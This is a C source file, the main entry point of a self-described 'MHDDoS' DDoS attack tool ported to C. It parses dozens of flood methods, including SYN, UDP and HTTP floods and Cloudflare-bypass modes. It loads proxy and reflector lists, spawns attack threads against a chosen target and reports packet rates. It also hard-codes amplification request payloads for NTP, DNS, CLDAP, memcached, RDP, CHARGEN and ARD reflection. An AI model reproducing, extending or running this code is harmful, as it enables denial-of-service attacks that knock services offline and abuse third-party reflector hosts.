#include "mhddos.h"

static void usage(const char *prog) {
    printf(
        "* MHDDoS - DDoS Attack Script (C Port)\n"
        "Note: If the Proxy list is empty, The attack will run without proxies\n"
        " > Methods:\n"
        " - Layer4\n"
        " | TCP, UDP, SYN, ICMP, VSE, TS3, MCPE, FIVEM, FIVEM-TOKEN,\n"
        " | OVH-UDP, MINECRAFT, CPS, CONNECTION, MCBOT,\n"
        " | MEM, NTP, DNS, ARD, CLDAP, CHAR, RDP\n"
        " - Layer7\n"
        " | GET, POST, CFB, BYPASS, OVH, STRESS, DYN, SLOW, HEAD,\n"
        " | NULL, COOKIE, PPS, EVEN, GSB, DGB, AVB, CFBUAM,\n"
        " | APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER, TOR, RHEX, STOMP\n"
        "\n"
        "Example:\n"
        "   L7: %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>\n"
        "   L4: %s <method> <ip:port> <threads> <duration>\n"
        "   L4 Proxied: %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n"
        "   L4 Amp: %s <method> <ip:port> <threads> <duration> <reflector_file>\n",
        prog, prog, prog, prog);
}

static void set_amp_payload(layer4_args_t *args, const uint8_t *payload, int len, int port) {
    memcpy(args->amp_payload, payload, len);
    args->amp_payload_len = len;
    args->amp_port = port;
}

int main(int argc, char *argv[]) {
    srand(time(NULL) ^ getpid());
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    get_local_ip(g_local_ip, sizeof(g_local_ip));

    if (argc < 2) { usage(argv[0]); return 1; }

    if (strcasecmp(argv[1], "HELP") == 0) { usage(argv[0]); return 0; }

    method_t method = parse_method(argv[1]);
    if (method == METHOD_UNKNOWN) {
        fprintf(stderr, BCOLORS_FAIL "Method Not Found" BCOLORS_RESET "\n");
        usage(argv[0]);
        return 1;
    }

    if (argc < 3) { usage(argv[0]); return 1; }

    volatile int running = 0;
    char urlraw[4096];
    strncpy(urlraw, argv[2], sizeof(urlraw) - 1);
    if (strncmp(urlraw, "http", 4) != 0) {
        char tmp[4096];
        snprintf(tmp, sizeof(tmp), "http://%s", urlraw);
        strncpy(urlraw, tmp, sizeof(urlraw) - 1);
    }

    if (is_layer7(method)) {
        if (argc < 8) {
            fprintf(stderr, "L7 Usage: %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>\n", argv[0]);
            return 1;
        }

        url_t target;
        parse_url(urlraw, &target);

        char host_ip[256];
        struct hostent *he = gethostbyname(target.host);
        if (!he) {
            fprintf(stderr, BCOLORS_FAIL "Cannot resolve hostname %s" BCOLORS_RESET "\n", target.host);
            return 1;
        }
        inet_ntop(AF_INET, he->h_addr_list[0], host_ip, sizeof(host_ip));

        int proxy_ty = atoi(argv[3]);
        int threads = atoi(argv[4]);
        int rpc = atoi(argv[6]);
        int timer = atoi(argv[7]);

        char ua_path[512], ref_path[512], proxy_path[512];
        snprintf(ua_path, sizeof(ua_path), "files/useragent.txt");
        snprintf(ref_path, sizeof(ref_path), "files/referers.txt");
        snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[5]);

        char **useragents = NULL, **referers = NULL;
        int ua_count = load_lines(ua_path, &useragents, MAX_USERAGENTS);
        int ref_count = load_lines(ref_path, &referers, MAX_REFERERS);

        if (ua_count == 0) {
            static char *default_ua[] = {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/74.0.3729.169 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
            };
            useragents = default_ua;
            ua_count = 2;
        }
        if (ref_count == 0) {
            static char *default_ref[] = {
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                "https://www.google.com/translate?u="
            };
            referers = default_ref;
            ref_count = 2;
        }

        proxy_t *proxies = NULL;
        int proxy_count = 0;
        proxy_t proxy_arr[MAX_PROXIES];
        proxy_type_t pt = (proxy_type_t)proxy_ty;
        if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + rand() % 3);
        proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
        if (proxy_count > 0) {
            proxies = proxy_arr;
            printf(BCOLORS_WARNING "Proxy Count: " BCOLORS_OKBLUE "%d" BCOLORS_RESET "\n", proxy_count);
        } else {
            printf(BCOLORS_WARNING "Empty Proxy File, running flood without proxy" BCOLORS_RESET "\n");
        }

        if (threads > 1000)
            printf(BCOLORS_WARNING "Thread is higher than 1000" BCOLORS_RESET "\n");
        if (rpc > 100)
            printf(BCOLORS_WARNING "RPC is higher than 100" BCOLORS_RESET "\n");

        SSL_CTX *ssl_ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, NULL);
        SSL_CTX_set_min_proto_version(ssl_ctx, TLS1_2_VERSION);

        pthread_t tids[MAX_THREADS];
        layer7_args_t *thread_args = calloc(threads, sizeof(layer7_args_t));

        for (int i = 0; i < threads; i++) {
            thread_args[i].target = target;
            strncpy(thread_args[i].host_ip, host_ip, sizeof(thread_args[i].host_ip));
            thread_args[i].method = method;
            thread_args[i].rpc = rpc;
            thread_args[i].thread_id = i;
            thread_args[i].proxies = proxies;
            thread_args[i].proxy_count = proxy_count;
            thread_args[i].useragents = useragents;
            thread_args[i].useragent_count = ua_count;
            thread_args[i].referers = referers;
            thread_args[i].referer_count = ref_count;
            thread_args[i].running = &running;
            thread_args[i].ssl_ctx = ssl_ctx;
            strncpy(thread_args[i].local_ip, g_local_ip, sizeof(thread_args[i].local_ip));
            pthread_create(&tids[i], NULL, layer7_thread, &thread_args[i]);
        }

        printf(BCOLORS_WARNING "Attack Started to" BCOLORS_OKBLUE " %s " BCOLORS_WARNING
               "with" BCOLORS_OKBLUE " %s " BCOLORS_WARNING "method for" BCOLORS_OKBLUE
               " %d " BCOLORS_WARNING "seconds, threads:" BCOLORS_OKBLUE " %d" BCOLORS_WARNING
               "!" BCOLORS_RESET "\n", target.host, argv[1], timer, threads);

        running = 1;
        time_t ts = time(NULL);
        while (time(NULL) < ts + timer) {
            char pps_buf[64], bps_buf[64];
            long req = atomic_exchange(&REQUESTS_SENT, 0);
            long byt = atomic_exchange(&BYTES_SEND, 0);
            humanformat(req, pps_buf, sizeof(pps_buf));
            humanbytes(byt, bps_buf, sizeof(bps_buf));
            double pct = (double)(time(NULL) - ts) / timer * 100.0;
            printf(BCOLORS_WARNING "PPS:" BCOLORS_OKBLUE " %s, " BCOLORS_WARNING
                   "BPS:" BCOLORS_OKBLUE " %s / %.1f%%" BCOLORS_RESET "\n", pps_buf, bps_buf, pct);
            sleep(1);
        }
        running = 0;
        sleep(1);
        SSL_CTX_free(ssl_ctx);
        free(thread_args);

    } else if (is_layer4(method)) {
        if (argc < 5) {
            fprintf(stderr, "L4 Usage: %s <method> <ip:port> <threads> <duration>\n", argv[0]);
            return 1;
        }

        url_t target;
        parse_url(urlraw, &target);

        char target_ip[256];
        struct hostent *he = gethostbyname(target.host);
        if (!he) {
            fprintf(stderr, BCOLORS_FAIL "Cannot resolve hostname %s" BCOLORS_RESET "\n", target.host);
            return 1;
        }
        inet_ntop(AF_INET, he->h_addr_list[0], target_ip, sizeof(target_ip));

        int port = target.port;
        if (port <= 0 || port > 65535) { port = 80; }

        int threads = atoi(argv[3]);
        int timer = atoi(argv[4]);

        if ((method == METHOD_SYN || method == METHOD_ICMP || method == METHOD_NTP ||
             method == METHOD_DNS_AMP || method == METHOD_RDP || method == METHOD_CHAR ||
             method == METHOD_MEM || method == METHOD_CLDAP || method == METHOD_ARD) &&
            !check_raw_socket()) {
            fprintf(stderr, BCOLORS_FAIL "Cannot Create Raw Socket (need root)" BCOLORS_RESET "\n");
            return 1;
        }

        proxy_t *proxies = NULL;
        int proxy_count = 0;
        proxy_t proxy_arr[MAX_PROXIES];

        char **refs = NULL;
        int ref_count = 0;

        if (argc >= 6) {
            if (is_amp(method)) {
                char ref_path[512];
                snprintf(ref_path, sizeof(ref_path), "files/%s", argv[5]);
                FILE *rf = fopen(ref_path, "r");
                if (rf) {
                    refs = malloc(sizeof(char*) * MAX_REFS);
                    char line[256];
                    while (fgets(line, sizeof(line), rf) && ref_count < MAX_REFS) {
                        line[strcspn(line, "\r\n")] = 0;
                        if (strlen(line) > 6) {
                            refs[ref_count] = strdup(line);
                            ref_count++;
                        }
                    }
                    fclose(rf);
                }
                if (ref_count == 0) do_exit("Empty Reflector File");
            } else if (argc >= 7) {
                int proxy_ty = atoi(argv[5]);
                proxy_type_t pt = (proxy_type_t)proxy_ty;
                if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + rand() % 3);
                char proxy_path[512];
                snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[6]);
                proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
                if (proxy_count > 0) proxies = proxy_arr;
            }
        }

        int protocolid = MINECRAFT_DEFAULT_PROTOCOL;

        pthread_t tids[MAX_THREADS];
        layer4_args_t *thread_args = calloc(threads, sizeof(layer4_args_t));

        for (int i = 0; i < threads; i++) {
            strncpy(thread_args[i].target_ip, target_ip, sizeof(thread_args[i].target_ip));
            thread_args[i].target_port = port;
            thread_args[i].method = method;
            thread_args[i].protocolid = protocolid;
            thread_args[i].proxies = proxies;
            thread_args[i].proxy_count = proxy_count;
            thread_args[i].refs = refs;
            thread_args[i].ref_count = ref_count;
            thread_args[i].running = &running;
            strncpy(thread_args[i].local_ip, g_local_ip, sizeof(thread_args[i].local_ip));

            if (method == METHOD_ICMP)
                thread_args[i].target_port = 0;

            if (method == METHOD_RDP) {
                uint8_t p[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 16, 3389);
            } else if (method == METHOD_CLDAP) {
                uint8_t p[] = {0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,0x0a,0x01,0x00,
                               0x02,0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,0x87,0x0b,0x6f,0x62,0x6a,0x65,
                               0x63,0x74,0x63,0x6c,0x61,0x73,0x73,0x30,0x00};
                set_amp_payload(&thread_args[i], p, 39, 389);
            } else if (method == METHOD_MEM) {
                uint8_t p[] = {0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,'g','e','t','s',' ','p',' ','h',' ','e','\n'};
                set_amp_payload(&thread_args[i], p, 19, 11211);
            } else if (method == METHOD_CHAR) {
                uint8_t p[] = {0x01};
                set_amp_payload(&thread_args[i], p, 1, 19);
            } else if (method == METHOD_ARD) {
                uint8_t p[] = {0x00,0x14,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 4, 3283);
            } else if (method == METHOD_NTP) {
                uint8_t p[] = {0x17,0x00,0x03,0x2a,0x00,0x00,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 8, 123);
            } else if (method == METHOD_DNS_AMP) {
                uint8_t p[] = {0x45,0x67,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x73,0x6c,
                               0x00,0x00,0xff,0x00,0x01,0x00,0x00,0x29,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 31, 53);
            }

            pthread_create(&tids[i], NULL, layer4_thread, &thread_args[i]);
        }

        printf(BCOLORS_WARNING "Attack Started to" BCOLORS_OKBLUE " %s:%d " BCOLORS_WARNING
               "with" BCOLORS_OKBLUE " %s " BCOLORS_WARNING "method for" BCOLORS_OKBLUE
               " %d " BCOLORS_WARNING "seconds, threads:" BCOLORS_OKBLUE " %d" BCOLORS_WARNING
               "!" BCOLORS_RESET "\n", target_ip, port, argv[1], timer, threads);

        running = 1;
        time_t ts = time(NULL);
        while (time(NULL) < ts + timer) {
            char pps_buf[64], bps_buf[64];
            long req = atomic_exchange(&REQUESTS_SENT, 0);
            long byt = atomic_exchange(&BYTES_SEND, 0);
            humanformat(req, pps_buf, sizeof(pps_buf));
            humanbytes(byt, bps_buf, sizeof(bps_buf));
            double pct = (double)(time(NULL) - ts) / timer * 100.0;
            printf(BCOLORS_WARNING "PPS:" BCOLORS_OKBLUE " %s, " BCOLORS_WARNING
                   "BPS:" BCOLORS_OKBLUE " %s / %.1f%%" BCOLORS_RESET "\n", pps_buf, bps_buf, pct);
            sleep(1);
        }
        running = 0;
        sleep(1);
        free(thread_args);
    }

    return 0;
}
